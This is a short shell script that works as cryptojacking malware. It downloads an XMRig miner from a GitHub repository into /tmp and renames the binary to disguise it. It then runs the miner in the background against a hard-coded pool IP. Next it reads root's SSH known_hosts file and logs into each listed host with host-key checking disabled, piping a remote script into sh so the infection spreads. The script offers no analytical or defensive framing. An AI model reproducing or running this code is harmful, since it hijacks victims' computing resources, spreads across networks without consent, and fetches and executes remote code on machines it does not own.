wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/zayting.tar.gz
tar -xvzf /tmp/zayting.tar.gz -C /tmp/
mv /tmp/xmrig-6.14.1 /tmp/zayting
mv /tmp/zayting/xmrig /tmp/zayting/zayting
chmod +x /tmp/zayting/zayting
nohup /tmp/zayting/zayting -o 107.182.176.159:8989 -u worker3 -p x -t 1 -B --cpu-priority 3 --cpu-max-threads-hint=50% --nicehash >/dev/null 2>&1 &


if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr.sh||wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr.sh)|sh >/dev/null 2>&1 &' & done
fi

